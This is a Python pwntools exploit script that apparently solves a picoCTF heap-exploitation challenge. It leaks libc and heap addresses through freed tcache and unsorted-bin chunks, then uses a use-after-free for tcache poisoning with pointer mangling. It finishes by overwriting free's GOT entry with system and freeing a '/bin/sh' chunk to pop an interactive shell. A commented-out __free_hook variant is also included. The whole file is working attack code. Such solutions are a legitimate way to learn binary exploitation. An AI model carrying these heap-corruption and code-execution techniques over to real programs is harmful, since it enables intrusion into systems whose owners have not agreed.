#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./vuln", checksec=False)
libc = ELF("./libc.so.6", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc saturn.picoctf.net 64980"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


def cheat(idx, name, new_idx):
    io.sendlineafter(b"Choice: ", b"0")
    io.sendlineafter(b"(0-17)? ", str(idx).encode())
    io.sendlineafter(b"characters: ", name)
    io.sendlineafter(b"spot? ", str(new_idx).encode())


def add(idx, name, length=None):
    if length is None:
        length = len(name)

    io.sendlineafter(b"Choice: ", b"1")
    io.sendlineafter(b"(0-17)? ", str(idx).encode())
    io.sendlineafter(b"(16-256)? ", str(length).encode())
    io.sendlineafter(b"characters: ", name)


def rm(idx):
    io.sendlineafter(b"Choice: ", b"2")
    io.sendlineafter(b"(0-17)? ", str(idx).encode())


def race():
    io.sendlineafter(b"Choice: ", b"3")


def deobf(x):
    mask = 0xfff << 36
    while mask:
        x ^= (x & mask) >> 12
        mask >>= 12
    return x


def mangle(pos, ptr):
    return (pos >> 12) ^ ptr


env = {}
io = start()

"""
The function to get input for horse name could be used to input nothing by
sending b'\xff'.

To get heap leak:
- allocate two chunks and provide any name input
- free them (goes into tcachebins)
- allocate two chunks again and provide b'\xff' as name input
- choose the race option and we could get heap leak from the chunk's fd field

To get libc leak, we would need to have free chunks inside unsorted bin

We have UAF with choice 0, so we could just do tcache poisoning
"""

sz = 0xdf
for i in range(7):
    add(i, b"\xff", sz)

add(7, b"\xff", sz)
add(8, b"padding\xff", sz)

log.info("Fill up tcachebins")
for i in range(7):
    rm(i)

# Populate unsorted bin
rm(7)
rm(8)

add(0, b"a\xff", sz + 0x10)

for i in range(1, 8):
    add(i, b"\xff", sz)

race()

if args.REMOTE:
    io.recvline()

libc_leak = u64(io.recvline().split(b"|")[0].strip().ljust(8, b"\x00"))
heap_leak = u64(io.recvline().split(b"|")[0].strip().ljust(8, b"\x00"))

libc.address = (libc_leak >> 8 << 8) - 0x1bdc00
heap = deobf(heap_leak) >> 12 << 12
log.info(f"{libc.address=:#x}")
log.info(f"{heap=:#x}")

io.recvuntil(b"WINNER")

for i in range(1, 8):
    rm(i)

context.log_level = 'DEBUG'

# payload = p64(mangle(heap, libc.symbols["__free_hook"])) + b"\xff"
# cheat(7, payload, 7)
#
# add(1, b"/bin/sh\x00\xff", 0x7f)
# payload = p64(libc.symbols["system"])
# add(2, payload + b"\xff", 0x7f)
# rm(1)

payload = p64(mangle(heap, elf.got["free"] - 0x8)) + b"\xff"
cheat(7, payload, 7)

ret_gadget = 0x401E48
add(1, b"/bin/sh\x00\xff", sz)
payload = flat(libc.address + 0x1e19d0,
               elf.plt["system"])
add(2, payload + b"\xff", sz)
rm(1)

context.log_level = 'INFO'
io.interactive()
